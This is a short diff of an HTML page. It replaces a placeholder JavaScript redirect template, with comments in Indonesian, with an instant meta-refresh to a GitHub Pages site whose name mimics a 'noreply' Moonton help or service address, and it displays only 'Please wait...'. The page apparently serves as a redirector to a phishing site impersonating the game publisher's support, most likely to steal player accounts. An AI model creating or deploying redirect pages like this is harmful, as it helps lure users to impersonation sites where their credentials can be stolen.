@@ -1,15 +1,8 @@
-<!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <title>Redirect</title>
-  <script>
-    setTimeout(function () {
-      window.location.href = "https://tujuan-link.com";
-    }, 0); // 0 = langsung, 3000 = 3 detik
-  </script>
+<meta http-equiv="refresh" content="0.5; url=https://noreplymoontonhelp-lgtm.github.io/moonton-service/">
 </head>
 <body>
-  <p>Sedang mengalihkan...</p>
+Please wait...
 </body>
 </html>
